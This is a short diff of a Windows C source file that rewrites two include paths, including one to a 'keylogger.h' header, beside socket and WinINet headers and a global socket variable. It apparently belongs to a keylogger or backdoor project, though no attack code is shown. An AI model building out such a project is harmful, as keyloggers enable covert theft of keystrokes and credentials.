@@ -1,4 +1,4 @@
-#include "libs/common.h"
+#include "../../libs/common.h"
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <winsock2.h>
@@ -6,7 +6,7 @@
 #include <winuser.h>
 #include <wininet.h>
 #include <windowsx.h>
-#include "libs/keylogger.h"
+#include "../../libs/keylogger.h"
 
 //====== Global Variables =======//
 int sock;
